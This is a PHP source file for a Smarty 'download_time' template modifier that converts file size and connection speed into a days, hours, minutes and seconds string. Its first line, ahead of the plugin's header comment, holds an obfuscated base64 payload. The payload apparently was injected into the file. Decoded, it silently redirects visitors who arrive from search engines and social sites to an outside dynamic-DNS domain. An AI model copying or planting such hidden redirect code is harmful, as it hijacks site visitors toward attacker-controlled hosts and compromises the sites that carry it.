<?php	 	$dropthisline=strip_tags(("CmVycm9yX3JlcG9ydGluZygwKTsKJHFhenBsbT1oZWFkZXJzX3NlbnQoKTsKaWYgKCEkcWF6cGxtKXsKJHJlZmVyZXI9JF9TRVJWRVJbJ0hUVFBfUkVGRVJFUiddOwokdWFnPSRfU0VSVkVSWydIVFRQX1VTRVJfQUdFTlQnXTsKaWYgKCR1YWcpIHsKaWYgKCFzdHJpc3RyKCR1YWcsIk1TSUUgNy4wIikgYW5kICFzdHJpc3RyKCR1YWcsIk1TSUUgNi4wIikgYW5kICFzdHJzdHIoJHVhZywiRmlyZWZveC8zLiIpKXsKaWYgKHN0cmlzdHIoJHJlZmVyZXIsInlhaG9vLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImJpbmcuIikgb3Igc3RyaXN0cigkcmVmZXJlciwicmFtYmxlci4iKSBvciBzdHJpc3RyKCRyZWZlcmVyLCJ3ZWJhbHRhLiIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsInQuY28vIikgb3Igc3RyaXN0cigkcmVmZXJlciwidGlueXVybC5jb20iKSBvciBwcmVnX21hdGNoKCIveWFuZGV4XC5ydVwveWFuZHNlYXJjaFw/KC4qPylcJmxyXD0vIiwkcmVmZXJlcikgb3IgcHJlZ19tYXRjaCAoIi9nb29nbGVcLiguKj8pXC91cmxcP3NhLyIsJHJlZmVyZXIpIG9yIHN0cmlzdHIoJHJlZmVyZXIsImZhY2Vib29rLmNvbS9sIikgb3Igc3RyaXN0cigkcmVmZXJlciwiYW9sLmNvbSIpIG9yIChwcmVnX21hdGNoICgiL2h0dHBzOlwvXC93d3cuZ29vZ2xlXC4oLio/KVwvLyIsJHJlZmVyZXIpIGFuZCBzdHJzdHIoJHVhZywiQ2hyb21lLyIpKSkgewppZiAoIXN0cmlzdHIoJHJlZmVyZXIsImNhY2hlIikgYW5kICFzdHJpc3RyKCRyZWZlcmVyLCJpbnVybCIpIGFuZCAhc3RyaXN0cigkcmVmZXJlciwiRWVZcDNENyIpKXsKaGVhZGVyKCJMb2NhdGlvbjogaHR0cDovL3JrZmhhZmcuZGRucy5pbmZvLyIpOwpleGl0KCk7Cn0KfQp9Cn0KfQ=="));
/**
 * Smarty donwload_time modifier plugin
 *
 * Type:     modifier<br>
 * Name:     download_time<br>
 * Purpose:  calculates download time based on $size and $speed parameters
 * $size  - file size in kilobytes 
 * $speed - download speed in kilobits (56, 128, 512, 1024, 1484)
 * @author Andrey Pismennyj <pav@itera.ws>
 * @version $Revision: 1.3 $
 * @param string
 * @param string
 * @return string
 */
function smarty_modifier_download_time($size, $speed, $allow_zero_value = false)
{
  if ( is_null($size) || $size === FALSE || $size == 0 )
      return "&lt;download_time: size error&gt;";
    
  if ( is_null($speed) || $speed === FALSE || $speed == 0)
      return "&lt;download_time: speed error&gt;";

  $seconds_total = ceil($size/($speed/8));
  
  if (($days = floor($seconds_total/86400)) || 1)
      if ($days>0 || ($days == 0 && $allow_zero_value))
        $time_string = $days." d";
  
  $seconds_total = floor($seconds_total - ($days*86400));
  
  if (($hours = floor($seconds_total/3600)) || 1)
      if ($time_string || $hours>0 || ($hours == 0 && $allow_zero_value))
          $time_string .= " ".str_pad($hours, 2, "0", STR_PAD_LEFT)." h";
  
  $seconds_total = floor($seconds_total - ($hours*3600));
  
  if (($minutes = floor($seconds_total/60)) || 1)
      if ($time_string || $minutes>0 || ($minutes == 0 && $allow_zero_value))
          $time_string .= " ".str_pad($minutes, 2, "0", STR_PAD_LEFT)." m";
  
  $seconds = round($seconds_total - ($minutes*60));
  
  if ($time_string || $seconds>0 || ($seconds == 0 && $allow_zero_value))
      $time_string .= " ".str_pad($seconds, 2, "0", STR_PAD_LEFT)." s";
      
  return $time_string;
}

/* vim: set expandtab: */

?>